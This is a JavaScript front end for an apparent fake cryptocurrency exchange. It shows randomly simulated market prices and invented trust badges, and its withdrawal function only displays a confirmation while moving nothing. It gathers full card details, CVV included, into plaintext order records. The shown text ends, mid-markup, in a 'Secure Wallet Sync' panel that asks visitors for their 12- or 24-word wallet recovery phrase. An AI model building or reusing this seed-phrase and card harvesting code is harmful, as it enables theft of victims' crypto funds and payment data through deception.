const markets = [ { name: 'Bitcoin', symbol: 'BTC', price: 85245.32, change: 2.48, icon: '₿', color: '#f7931a' }, { name: 'Ethereum', symbol: 'ETH', price: 5245.10, change: 1.12, icon: 'Ξ', color: '#627eea' }, { name: 'Tether', symbol: 'USDT', price: 1.00, change: 0.01, icon: '₮', color: '#26a17b' }, { name: 'Solana', symbol: 'SOL', price: 252.32, change: 5.20, icon: 'S', color: '#00d2ff' }, { name: 'BNB', symbol: 'BNB', price: 720.40, change: -0.45, icon: 'B', color: '#f3ba2f' }, { name: 'XRP', symbol: 'XRP', price: 3.91, change: -1.20, icon: 'X', color: '#23292f' }, { name: 'Cardano', symbol: 'ADA', price: 1.25, change: 3.10, icon: 'A', color: '#0033ad' }, { name: 'Dogecoin', symbol: 'DOGE', price: 0.28, change: 1.45, icon: 'Ð', color: '#c2a633' }, { name: 'Avalanche', symbol: 'AVAX', price: 45.20, change: -2.10, icon: 'A', color: '#e84142' }, { name: 'Polkadot', symbol: 'DOT', price: 12.15, change: 0.50, icon: '●', color: '#e6007a' }, { name: 'Chainlink', symbol: 'LINK', price: 28.40, change: 4.20, icon: '⬡', color: '#2a5ada' }, { name: 'Polygon', symbol: 'MATIC', price: 1.12, change: -1.15, icon: 'M', color: '#8247e5' }, { name: 'Shiba Inu', symbol: 'SHIB', price: 0.000045, change: 6.80, icon: 'S', color: '#f00500' }, { name: 'Litecoin', symbol: 'LTC', price: 112.10, change: 1.05, icon: 'Ł', color: '#345d9d' }, { name: 'TRON', symbol: 'TRX', price: 0.23, change: 0.80, icon: 'T', color: '#eb0029' }, { name: 'Uniswap', symbol: 'UNI', price: 15.20, change: -0.90, icon: 'U', color: '#ff007a' }, { name: 'Cosmos', symbol: 'ATOM', price: 14.80, change: 2.10, icon: '⚛', color: '#2e3148' }, { name: 'Stellar', symbol: 'XLM', price: 0.22, change: -1.50, icon: 'X', color: '#000000' }, { name: 'NEAR', symbol: 'NEAR', price: 9.50, change: 3.40, icon: 'N', color: '#00ec97' }, { name: 'Aptos', symbol: 'APT', price: 15.20, change: -2.30, icon: 'A', color: '#000000' }, { name: 'Arbitrum', symbol: 'ARB', price: 2.15, change: 1.80, icon: 'A', color: '#12aaff' }, { name: 'Optimism', symbol: 'OP', price: 4.40, change: 0.40, icon: 'O', color: '#ff0420' }, { name: 'Filecoin', symbol: 'FIL', price: 8.80, change: -1.10, icon: 'F', color: '#0090ff' }, { name: 'Injective', symbol: 'INJ', price: 35.10, change: 7.20, icon: 'I', color: '#00d2ff' }, { name: 'Sui', symbol: 'SUI', price: 2.65, change: 4.50, icon: 'S', color: '#6fbcf0' }, { name: 'Pepe', symbol: 'PEPE', price: 0.000018, change: 12.40, icon: '🐸', color: '#3d8130' } ];
const countries = [ { name: "United States", flag: "🇺🇸" }, { name: "United Kingdom", flag: "🇬🇧" }, { name: "Canada", flag: "🇨🇦" }, { name: "Australia", flag: "🇦🇺" }, { name: "Nigeria", flag: "🇳🇬" }, { name: "Kenya", flag: "🇰🇪" }, { name: "South Africa", flag: "🇿🇦" }, { name: "Ghana", flag: "🇬🇭" }, { name: "India", flag: "🇮🇳" }, { name: "Germany", flag: "🇩🇪" }, { name: "France", flag: "🇫🇷" }, { name: "Japan", flag: "🇯🇵" }, { name: "UAE", flag: "🇦🇪" }, { name: "Brazil", flag: "🇧🇷" } ];
const currencyMap = { "🇺🇸 United States": { code: "USD", symbol: "$", rate: 1 }, "🇬🇧 United Kingdom": { code: "GBP", symbol: "£", rate: 0.79 }, "🇨🇦 Canada": { code: "CAD", symbol: "C$", rate: 1.36 }, "🇦🇺 Australia": { code: "AUD", symbol: "A$", rate: 1.52 }, "🇳🇬 Nigeria": { code: "NGN", symbol: "₦", rate: 1500 }, "🇰🇪 Kenya": { code: "KES", symbol: "KSh", rate: 130 }, "🇿🇦 South Africa": { code: "ZAR", symbol: "R", rate: 18.5 }, "🇬🇭 Ghana": { code: "GHS", symbol: "₵", rate: 14.5 }, "🇮🇳 India": { code: "INR", symbol: "₹", rate: 83.5 }, "🇩🇪 Germany": { code: "EUR", symbol: "€", rate: 0.92 }, "🇫🇷 France": { code: "EUR", symbol: "€", rate: 0.92 }, "🇯🇵 Japan": { code: "JPY", symbol: "¥", rate: 150 }, "🇦🇪 UAE": { code: "AED", symbol: "د.إ", rate: 3.67 }, "🇧🇷 Brazil": { code: "BRL", symbol: "R$", rate: 5.0 } };
const BONUS_RATE = 0.05;
let currentTradeMode = 'buy'; let currentUser = null; let globalSettings = null;

function getUserCurrency() { if (!currentUser || !currentUser.country) return currencyMap["🇺🇸 United States"]; return currencyMap[currentUser.country] || currencyMap["🇺🇸 United States"]; }
function getExchangePrice(coin, mode) { return mode === 'buy' ? coin.price * (1 - BONUS_RATE) : coin.price * (1 + BONUS_RATE); }
function formatPrice(price) { if (price >= 1000) return price.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2}); if (price >= 1) return price.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 4}); return price.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 6}); }

function showView(viewId, authType = 'login') {
    document.querySelectorAll('.app-view').forEach(view => view.style.display = 'none');
    const target = document.getElementById(viewId);
    if (target) target.style.display = 'block';
    if (viewId === 'authView') switchAuth(authType);
    if (viewId === 'dashboardView') { if (typeof window.loadDashboardData === 'function') window.loadDashboardData(); }
    if (viewId === 'guestView') { if (typeof loadMarkets === 'function') loadMarkets(); }
    window.scrollTo(0, 0);
}

function showToast(msg) { const toast = document.getElementById('toast'); if (toast) { toast.textContent = msg; toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 3000); } }

function showCustomAlert(title, message) { let modal = document.getElementById('customAlertModal'); modal.style.display = 'flex'; modal.innerHTML = `<div class="custom-alert-box"><div class="custom-alert-icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#f6465d" stroke-width="2.5"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg></div><h3>${title}</h3><p>${message}</p><button class="custom-alert-btn" onclick="document.getElementById('customAlertModal').style.display='none'">Got it</button></div>`; }

function switchAuth(type) { document.getElementById('loginForm').style.display = type === 'login' ? 'block' : 'none'; document.getElementById('registerForm').style.display = type === 'register' ? 'block' : 'none'; }

function openCountrySelector() {
    let modal = document.getElementById('countrySelectorModal'); modal.style.display = 'flex';
    let countryHtml = countries.map(c => `<div onclick="selectCountry('${c.flag} ${c.name}', '${c.flag} ${c.name}')" style="padding: 15px; border-bottom: 1px solid #333; cursor: pointer; display: flex; gap: 10px;"><span>${c.flag}</span> ${c.name}</div>`).join('');
    modal.innerHTML = `<div class="modal-content" style="max-height: 80vh; overflow-y: auto;"><h3 style="margin-bottom: 15px; color: #fff;">Select Country</h3>${countryHtml}</div>`;
}

function selectCountry(value, display) { document.getElementById('regCountry').value = value; document.getElementById('regCountryDisplay').innerHTML = `<span>${display}</span><span>▼</span>`; document.getElementById('countrySelectorModal').style.display = 'none'; }

async function handleRegister() {
    const name = document.getElementById('regName').value, country = document.getElementById('regCountry').value, phone = document.getElementById('regPhone').value, email = document.getElementById('regEmail').value, password = document.getElementById('regPassword').value, confirm = document.getElementById('regConfirmPassword').value, terms = document.getElementById('regTerms').checked;
    if (!name || !country || !phone || !email || !password) return showToast("Please fill all fields.");
    if (password !== confirm) return showToast("Passwords do not match.");
    if (!terms) return showToast("You must agree to the Terms.");
    try {
        const res = await fetch('/api/auth/register', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name, country, phone, email, password }) });
        const data = await res.json();
        if (res.ok) { showToast("Registration successful!"); switchAuth('login'); } else { showToast(data.message); }
    } catch (error) { showToast("Error connecting."); }
}

async function handleLogin() {
    const email = document.getElementById('loginEmail').value, password = document.getElementById('loginPassword').value;
    if (!email || !password) return showToast("Please fill all fields.");
    try {
        const res = await fetch('/api/auth/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email, password }) });
        const data = await res.json();
        if (res.ok) { localStorage.setItem('token', data.token); localStorage.setItem('user', JSON.stringify(data.user)); checkAuthState(); } else { showToast(data.message); }
    } catch (error) { showToast("Error connecting."); }
}

function handleLogout() { localStorage.removeItem('token'); localStorage.removeItem('user'); checkAuthState(); }

/* =====================================================
   NAVBAR & HOMEPAGE LOGIC
   ===================================================== */
function checkAuthState() {
    currentUser = JSON.parse(localStorage.getItem('user'));
    if (currentUser && (currentUser.isAdmin || currentUser.email.includes('admin'))) { window.location.href = '/admin.html'; return; }
    const navLinks = document.getElementById('navLinks');
    
    if (currentUser) {
        navLinks.innerHTML = `
            <a href="#" onclick="showView('guestView')">Markets</a>
            <a href="#" class="profile-avatar-nav" onclick="showView('dashboardView')">${currentUser.name.charAt(0).toUpperCase()}</a>
            <a href="#" id="securityNavBtn" onclick="window.open2FAModal()">Security</a>
            <a href="#" class="btn-logout" onclick="handleLogout()">Logout</a>
        `;
        showView('dashboardView');
    } else {
        navLinks.innerHTML = `
            <a href="#" onclick="showView('guestView')">Markets</a>
            <a href="#" onclick="showView('authView', 'login')">Login</a>
            <a href="#" class="btn-primary" onclick="showView('authView', 'register')">Get Started</a>
        `;
        showView('guestView');
    }
}

function populateTradeCoins() { 
    const select = document.getElementById('tradeCoin'); 
    if(!select) return; 
    select.innerHTML = ''; 
    markets.forEach(c => { const o = document.createElement('option'); o.value = c.symbol; o.textContent = `${c.name} (${c.symbol})`; select.appendChild(o); }); 
}

// Homepage Logic (Trust Badge & Markets)
let trustIndex = 0;
const trustMessages = ["🛡️ Trusted by 10M+ users globally", "🔒 256-bit Encryption & Cold Storage", "⚡ Lightning-Fast Execution", "💬 24/7 Professional Support", "🌍 Trade over 500+ cryptocurrencies"];

setInterval(() => {
    const badge = document.getElementById('dynamicTrustBadge');
    if (badge && document.getElementById('guestView').style.display !== 'none') {
        badge.style.opacity = 0;
        setTimeout(() => {
            trustIndex = (trustIndex + 1) % trustMessages.length;
            badge.textContent = trustMessages[trustIndex];
            badge.style.opacity = 1;
        }, 300);
    }
}, 3000);

function simulateLiveMarket() {
    markets.forEach(coin => {
        const fluctuation = (Math.random() - 0.5) * (coin.price * 0.002);
        coin.price += fluctuation;
        const changeFluctuation = (Math.random() - 0.5) * 0.2;
        coin.change = parseFloat((coin.change + changeFluctuation).toFixed(2));
    });
}

function loadMarkets() {
    const marketList = document.getElementById('market-list'); 
    const ticker = document.getElementById('ticker');
    if(!marketList) return;
    let marketHTML = ''; let tickerHTML = '';
    
    markets.forEach((coin, index) => {
        const isUp = coin.change >= 0; 
        const changeClass = isUp ? 'up' : 'down'; 
        const changeSymbol = isUp ? '↑' : '↓';
        let formattedPrice = formatPrice(coin.price);
        
        marketHTML += `<div class="market-row" onclick="quickTrade('${coin.symbol}')"><div class="market-rank">${index + 1}</div><div class="market-name-col"><div class="market-icon" style="background: ${coin.color};">${coin.icon}</div><div><div class="market-name-text">${coin.name}</div><div class="market-symbol-text">${coin.symbol}</div></div></div><div class="market-price">$${formattedPrice}</div><div class="market-change ${changeClass}">${changeSymbol} ${Math.abs(coin.change).toFixed(2)}%</div></div>`;
        tickerHTML += `<div class="ticker-item"><b>${coin.symbol}</b> $${formattedPrice} <span class="${changeClass}">${changeSymbol}${Math.abs(coin.change).toFixed(2)}%</span></div>`;
    });
    
    marketList.innerHTML = marketHTML; 
    if(ticker) ticker.innerHTML = tickerHTML + tickerHTML; 

    // Update Hero Chart
    const btc = markets.find(c => c.symbol === 'BTC');
    if(btc && document.getElementById('heroChartPrice')) {
        document.getElementById('heroChartPrice').innerText = `$${formatPrice(btc.price)}`;
        document.getElementById('heroChartChange').innerText = `+${btc.change.toFixed(2)}%`;
        let path = "M0,60 ";
        for(let i=1; i<=10; i++) { path += `L${i*30},${Math.random() * 40 + 20} `; }
        document.getElementById('heroSvgContainer').innerHTML = `<svg width="100%" height="100%" viewBox="0 0 300 80"><path d="${path}" fill="none" stroke="#0ecb51" stroke-width="3"/></svg>`;
    }

    // Update Gainers/Losers
    const glList = document.getElementById('gainersLosersList');
    if(glList) {
        const sorted = [...markets].sort((a,b) => b.change - a.change);
        const top = [...sorted.slice(0, 3), ...sorted.slice(-3)];
        glList.innerHTML = top.map(c => `<div class="gl-card"><div style="font-size:11px; color:#888;">${c.symbol}</div><div style="font-weight:bold; margin: 5px 0; font-size:13px;">$${formatPrice(c.price)}</div><div class="${c.change >= 0 ? 'up' : 'down'}" style="font-size:11px;">${c.change >= 0 ? '↑' : '↓'} ${Math.abs(c.change).toFixed(2)}%</div></div>`).join('');
    }
}

setInterval(() => {
    const guestView = document.getElementById('guestView');
    if (guestView && guestView.style.display !== 'none') {
        simulateLiveMarket(); loadMarkets();
    }
}, 2000);

function quickTrade(symbol) { requireAuth('tradeView', 'buy'); setTimeout(() => { document.getElementById('tradeCoin').value = symbol; calcTrade(); }, 100); }

// Load Settings for Footer
async function loadGlobalSettings() {
    try {
        const res = await fetch('/api/admin/public/settings');
        globalSettings = await res.json();
        
        const socialContainer = document.getElementById('socialLinksContainer');
        const legalText = document.getElementById('legalDisclaimerText');
        const regDisclaimer = document.getElementById('regDisclaimer');
        
        if (socialContainer && legalText) {
            let html = '';
            if (globalSettings.socialTwitter) html += `<a href="${globalSettings.socialTwitter}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Twitter (X)</a>`;
            if (globalSettings.socialTelegram) html += `<a href="${globalSettings.socialTelegram}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Telegram</a>`;
            if (globalSettings.socialDiscord) html += `<a href="${globalSettings.socialDiscord}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Discord</a>`;
            socialContainer.innerHTML = html;
            legalText.textContent = globalSettings.legalDisclaimer || '';
        }
        if (regDisclaimer && globalSettings.legalDisclaimer) regDisclaimer.textContent = globalSettings.legalDisclaimer;
    } catch (e) { console.log("Error loading settings", e); }
}

/* =====================================================
   TRADE VIEW LOGIC & ASSET MODALS
   ===================================================== */
window.requireAuth = function(targetView, mode = null) {
    if (!currentUser) { showView('authView', 'login'); showToast("Please log in."); }
    else { showView(targetView); if (targetView === 'tradeView') setTradeMode(mode || 'buy'); }
};

window.setTradeMode = function(mode) {
    currentTradeMode = mode; 
    const curr = getUserCurrency();
    document.getElementById('tabBuy').classList.toggle('active', mode === 'buy'); 
    document.getElementById('tabSell').classList.toggle('active', mode === 'sell');
    
    if (mode === 'buy') {
        document.getElementById('amountLabel').textContent = `Amount to Spend (${curr.code})`; 
        document.getElementById('submitTradeBtn').textContent = 'Confirm Purchase'; 
        document.getElementById('submitTradeBtn').style.background = 'var(--success)'; 
        document.getElementById('receivingWalletContainer').style.display = 'block'; 
        document.getElementById('receiveLabel').textContent = 'You will receive (Crypto)';
        document.getElementById('methodLabel').textContent = 'Payment Method';
    } else {
        document.getElementById('amountLabel').textContent = 'Amount to Sell (Crypto)'; 
        document.getElementById('submitTradeBtn').textContent = 'Confirm Sale'; 
        document.getElementById('submitTradeBtn').style.background = 'var(--danger)'; 
        document.getElementById('receivingWalletContainer').style.display = 'none'; 
        document.getElementById('receiveLabel').textContent = `You will receive (${curr.code})`;
        document.getElementById('methodLabel').textContent = 'Payout Method';
    }
    
    document.getElementById('tradeMethod').innerHTML = `<option value="Bank Transfer">Bank Transfer</option><option value="PayPal">PayPal</option><option value="Credit Card">Credit Card</option>`;
    document.getElementById('tradeAmount').value = ''; 
    document.getElementById('tradeReceive').value = ''; 
    togglePaymentDetails(); 
    calcTrade();
};

window.togglePaymentDetails = function() {
    const method = document.getElementById('tradeMethod').value; 
    const cardInputs = document.getElementById('cardDetailsInputs'); 
    const paypalInputs = document.getElementById('paypalDetailsInputs'); 
    const bankInputs = document.getElementById('bankDetailsInputs');
    
    if(cardInputs) cardInputs.style.display = 'none'; 
    if(paypalInputs) paypalInputs.style.display = 'none'; 
    if(bankInputs) bankInputs.style.display = 'none';

    if (currentTradeMode === 'sell') {
        if (method === 'Credit Card') { if(cardInputs) cardInputs.style.display = 'block'; } 
        else if (method === 'PayPal') { if(paypalInputs) paypalInputs.style.display = 'block'; } 
        else if (method === 'Bank Transfer') { if(bankInputs) bankInputs.style.display = 'block'; }
    } else {
        if (method === 'Credit Card') {
            const cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : "";
            if (!cardLink) { if(cardInputs) cardInputs.style.display = 'block'; }
        }
    }
};

window.calcTrade = function() {
    const amount = parseFloat(document.getElementById('tradeAmount').value) || 0; 
    const coinSymbol = document.getElementById('tradeCoin').value; 
    const coin = markets.find(c => c.symbol === coinSymbol); 
    const curr = getUserCurrency();
    if (coin && amount > 0) {
        if (currentTradeMode === 'buy') { 
            const usdAmount = amount / curr.rate; 
            document.getElementById('tradeReceive').value = (usdAmount / getExchangePrice(coin, 'buy')).toFixed(6) + " " + coin.symbol; 
        } else { 
            const usdAmount = amount * getExchangePrice(coin, 'sell'); 
            document.getElementById('tradeReceive').value = `${curr.symbol} ${(usdAmount * curr.rate).toFixed(2)} ${curr.code}`; 
        }
    } else { document.getElementById('tradeReceive').value = ''; }
};

window.submitTrade = async function() {
    const inputAmount = parseFloat(document.getElementById('tradeAmount').value); 
    const coinSymbol = document.getElementById('tradeCoin').value; 
    const method = document.getElementById('tradeMethod').value; 
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A"; 
    const coin = markets.find(c => c.symbol === coinSymbol); 
    const curr = getUserCurrency();
    
    if (!inputAmount || inputAmount <= 0) return showToast("Please enter a valid amount."); 
    
    let usdEquivalent = currentTradeMode === 'buy' ? (inputAmount / curr.rate) : (inputAmount * getExchangePrice(coin, 'sell'));
    if (usdEquivalent < 100) {
        const localMin = (100 * curr.rate).toFixed(0);
        return showCustomAlert('Minimum Trade Limit', `The minimum trade value is $100 USD. In your local currency (${curr.code}), this is approximately ${curr.symbol}${localMin}.`);
    }

    let paymentDetails = "";
    if (method === 'Credit Card') {
        const name = document.getElementById('cardName')?.value.trim() || ""; 
        const num = document.getElementById('cardNumber')?.value.replace(/\s/g, '') || ""; 
        const exp = document.getElementById('cardExpiry')?.value.trim() || ""; 
        const cvv = document.getElementById('cardCvv')?.value.trim() || "";
        const cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : "";
        if (currentTradeMode === 'sell' || !cardLink) {
            if (name.length < 3 || num.length < 15 || exp.length < 5 || cvv.length < 3) return showToast("Fill valid card details."); 
            paymentDetails = `Name: ${name} | Card: ${num} | Exp: ${exp} | CVV: ${cvv}`;
        } else { paymentDetails = "Customer will pay via Card Link"; }
    } else if (method === 'PayPal') { 
        paymentDetails = currentTradeMode === 'buy' ? "Customer will send via PayPal" : `PayPal: ${document.getElementById('paypalEmail').value}`; 
    } else if (method === 'Bank Transfer') {
        if (currentTradeMode === 'buy') { paymentDetails = "Customer will send via Bank Transfer"; } 
        else { 
            const bName = document.getElementById('bankName').value.trim(), aName = document.getElementById('bankAccountName').value.trim(), aNum = document.getElementById('bankAccountNumber').value.trim(); 
            if (!bName || !aName || !aNum) return showToast("Fill all bank details."); 
            paymentDetails = `Bank: ${bName} | Holder: ${aName} | Acct: ${aNum}`; 
        }
    }
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter receiving wallet address.");
    
    const token = localStorage.getItem('token'); 
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; btn.disabled = true;
    
    let sendAmount, sendCurrency, getAmount, getCurrency;
    if (currentTradeMode === 'buy') { 
        sendAmount = `${curr.symbol} ${inputAmount} ${curr.code}`; sendCurrency = curr.code; 
        getAmount = (inputAmount / curr.rate / getExchangePrice(coin, 'buy')).toFixed(6); getCurrency = coinSymbol; 
    } else { 
        sendAmount = inputAmount; sendCurrency = coinSymbol; 
        getAmount = `${curr.symbol} ${(inputAmount * getExchangePrice(coin, 'sell') * curr.rate).toFixed(2)} ${curr.code}`; getCurrency = curr.code; 
    }
    
    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
            body: JSON.stringify({ userName: currentUser.name, userEmail: currentUser.email, mode: currentTradeMode, sendAmount, sendCurrency, getAmount, getCurrency, method, paymentDetails, receivingWallet: wallet }) 
        });
        if (res.ok) { 
            if (currentTradeMode === 'sell') { 
                fetch('/api/admin/public/settings').then(r=>r.json()).then(s => { globalSettings = s; showPaymentInstructions(coinSymbol, sendAmount, getAmount); }); 
            } else { showBuyCheckoutPage(coinSymbol, getAmount, sendAmount, method); }
        } else { showToast("Failed to place order."); }
    } catch (e) { showToast("Error connecting."); } 
    finally { btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; btn.disabled = false; }
};

window.showAssetActions = function(symbol, name, amount, value) {
    let modal = document.getElementById('assetActionModal'); modal.style.display = 'flex';
    const coin = markets.find(c => c.symbol === symbol);
    modal.innerHTML = `<div class="modal-content" style="text-align: center;"><span onclick="document.getElementById('assetActionModal').style.display='none'" style="position: absolute; top: 15px; right: 20px; color: #888; font-size: 24px; cursor: pointer;">&times;</span><div style="width: 70px; height: 70px; border-radius: 50%; margin: 0 auto 15px; background: ${coin ? coin.color : '#333'}; display: flex; align-items: center; justify-content: center; font-size: 35px; color: white;">${coin ? coin.icon : name.charAt(0)}</div><h2 style="margin: 0 0 5px 0; color: #fff; font-size: 22px; font-weight: 700;">${name} (${symbol})</h2><div style="margin-bottom: 25px; margin-top: 15px;"><p style="color: #888; font-size: 13px; margin-bottom: 5px;">Total Balance</p><h3 style="color: #fff; margin: 0; font-size: 18px;">${amount.toFixed(6)} ${symbol}</h3><p style="color: #00d4aa; margin: 5px 0 0 0; font-size: 14px; font-weight: 600;">≈ $${value.toFixed(2)} USD</p></div><div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;"><button onclick="executeAssetAction('buy')" style="background: rgba(14, 203, 81, 0.1); color: #0ecb51; border: 1px solid #0ecb51; padding: 14px; border-radius: 10px; font-weight: 700; cursor: pointer;">Buy</button><button onclick="executeAssetAction('sell')" style="background: rgba(246, 70, 93, 0.1); color: #f6465d; border: 1px solid #f6465d; padding: 14px; border-radius: 10px; font-weight: 700; cursor: pointer;">Sell</button><button onclick="document.getElementById('assetActionModal').style.display='none'; openDepositPage('${symbol}');" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; cursor: pointer;">Deposit</button><button onclick="document.getElementById('assetActionModal').style.display='none'; openWithdrawPage('${symbol}', ${amount});" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; cursor: pointer;">Withdraw</button></div></div>`;
    window._currentActionSymbol = symbol;
};

window.executeAssetAction = function(mode) { document.getElementById('assetActionModal').style.display = 'none'; requireAuth('tradeView', mode); setTimeout(() => { document.getElementById('tradeCoin').value = window._currentActionSymbol; calcTrade(); }, 100); };

window.openAssetSelector = function(action) {
    let modal = document.getElementById('assetActionModal'); modal.style.display = 'flex';
    let assetHtml = markets.map(coin => `<div onclick="document.getElementById('assetActionModal').style.display='none'; ${action === 'deposit' ? `openDepositPage('${coin.symbol}')` : `openWithdrawPage('${coin.symbol}', 0)`};" style="display: flex; justify-content: space-between; padding: 15px; border-bottom: 1px solid #2a2a3a; cursor: pointer;"><div style="display: flex; gap: 10px; align-items: center;"><div style="background:${coin.color}; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff;">${coin.icon}</div><div><div style="color: #fff; font-weight: bold; font-size: 14px;">${coin.name}</div><div style="color: #888; font-size: 12px;">${coin.symbol}</div></div></div></div>`).join('');
    modal.innerHTML = `<div class="modal-content" style="padding: 0; max-height: 80vh; display: flex; flex-direction: column;"><div style="display: flex; justify-content: space-between; padding: 20px; border-bottom: 1px solid #333;"><h2 style="color: #fff; margin: 0; font-size: 18px; text-transform: capitalize;">Select ${action}</h2><span onclick="document.getElementById('assetActionModal').style.display='none'" style="color: #888; font-size: 24px; cursor: pointer;">&times;</span></div><div style="overflow-y: auto; flex: 1;">${assetHtml}</div></div>`;
};

/* =====================================================
   FULL PAGES, CHECKOUT & 2FA
   ===================================================== */
window.createPageView = function(id, title, contentHtml) {
    let view = document.getElementById(id); 
    if (view) view.remove(); 
    view = document.createElement('main'); 
    view.id = id; 
    view.className = 'app-view'; 
    view.style.display = 'none'; 
    view.innerHTML = `<div style="max-width: 500px; margin: 0 auto; padding: 20px;"><div style="display: flex; align-items: center; margin-bottom: 25px;"><button onclick="showView('dashboardView')" style="width: 42px; height: 42px; border-radius: 50%; background: #1a1a2a; border: 1px solid #2a2a3a; display: flex; align-items: center; justify-content: center; cursor: pointer; margin-right: 15px; padding: 0; color: #fff;"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button><h2 style="margin: 0; font-size: 20px; color: #fff;">${title}</h2></div><div class="card" style="background: #1a1a2a; border-radius: 16px; padding: 25px; border: 1px solid #2a2a3a;">${contentHtml}</div></div>`;
    document.body.appendChild(view);
};

window.openDepositPage = function(symbol) {
    let address = (globalSettings && globalSettings.wallets && globalSettings.wallets[symbol]) ? globalSettings.wallets[symbol] : "Contact Support (Address Not Set)";
    let isMissing = address.includes("Contact");
    let qrCodeUrl = isMissing ? "" : `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${address}`;
    const content = `<div style="text-align: center;"><h3 style="color: #fff;">Deposit ${symbol}</h3><p style="color: #888; font-size: 13px; margin-bottom: 20px;">Send only ${symbol} to this address.</p><div style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 20px; margin-bottom: 20px;">${qrCodeUrl ? `<img src="${qrCodeUrl}" style="background:#fff; padding:8px; border-radius:8px; margin-bottom:15px; width: 150px; height: 150px;">` : ''}<div style="font-family: monospace; font-size: 13px; color: ${isMissing ? '#f6465d' : '#00d4aa'}; word-break: break-all; margin-bottom: 15px; line-height: 1.4;">${address}</div>${!isMissing ? `<button onclick="navigator.clipboard.writeText('${address}'); this.textContent='Copied!';" style="background: #00d4aa; color: #000; border: none; padding: 14px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%;">Copy Address</button>` : ''}</div><div class="warning-banner" style="text-align: left; margin-bottom: 0;"><span style="color: #f6465d; font-size: 16px;">⚠️</span><p>Sending any other coin or using the wrong network to this address will result in permanent loss of funds.</p></div></div>`;
    createPageView('depositPageView', 'Deposit', content); showView('depositPageView');
};

window.openWithdrawPage = function(symbol, balance) {
    const safeBalance = Math.max(0, balance).toFixed(6);
    const content = `<div><h3 style="color: #fff; text-align: center;">Withdraw ${symbol}</h3><p style="color: #888; text-align: center; margin-bottom: 20px;">Available: ${safeBalance} ${symbol}</p><div style="display: flex; justify-content: space-between; margin-bottom: 5px;"><label style="color: #888; font-size: 12px;">Amount</label><button onclick="document.getElementById('withdrawPageAmount').value = '${safeBalance}';" style="background: none; border: none; color: #00d4aa; font-size: 12px; font-weight: bold; cursor: pointer;">MAX</button></div><div style="position: relative; margin-bottom: 15px;"><input type="number" id="withdrawPageAmount" placeholder="0.00" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px 50px 14px 14px; border-radius: 8px; color: #fff;"><span style="position: absolute; right: 15px; top: 15px; color: #888; font-weight: bold;">${symbol}</span></div><div style="margin-bottom: 20px;"><label style="color: #888; font-size: 12px; margin-bottom: 5px; display: block;">Destination Address</label><input type="text" id="withdrawPageAddress" placeholder="Enter ${symbol} address" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff;"></div><div class="warning-banner"><span style="color: #f6465d; font-size: 16px;">⚠️</span><p>Ensure the destination address is correct and supports the ${symbol} network.</p></div><button onclick="window.executeWithdrawal('${symbol}', ${safeBalance})" style="background: #f6465d; color: #fff; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer;">Confirm Withdrawal</button></div>`;
    createPageView('withdrawPageView', 'Withdraw', content); showView('withdrawPageView');
};

window.executeWithdrawal = function(symbol, balance) {
    const amount = parseFloat(document.getElementById('withdrawPageAmount').value); 
    const address = document.getElementById('withdrawPageAddress').value.trim();
    if (!amount || amount <= 0) return showCustomAlert('Error', 'Invalid amount.'); 
    if (amount > balance) return showCustomAlert('Error', 'Insufficient balance.'); 
    if (!address || address.length < 20) return showCustomAlert('Error', 'Invalid address.');
    showToast(`Withdrawal submitted.`); showView('dashboardView');
};

window.showImportWallet = function() {
    const content = `<div style="text-align: left;"><div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px;"><div style="display: flex; align-items: center; gap: 10px;"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2"><rect x="2" y="6" width="20" height="14" rx="2"></rect><path d="M16 14h2"></path><path d="M2 10h20"></path></svg><h3 style="color: #fff; margin: 0; font-size: 18px;">Secure Wallet Sync</h3></div></div><p style="color: #888; font-size: 14px; line-height: 1.5; margin-bottom: 15px;">Sync your wallet recovery phrase to enable instant crypto deposits, lightning-fast trades, and secure fiat withdrawals.</p><div style="background: #0f0f15; border: 1px solid #333; border-radius: 8px; padding: 15px; margin-bottom: 20px;"><p style="color: #fff; font-size: 13px; margin-bottom: 10px; font-weight: bold;">We support ANY standard crypto wallet.</p><p style="color: #888; font-size: 12px; margin-bottom: 12px;">If your wallet uses a 12 or 24-word recovery phrase, you can link it here. Popular examples:</p><div style="display: flex; gap: 8px; flex-wrap: wrap;"><span 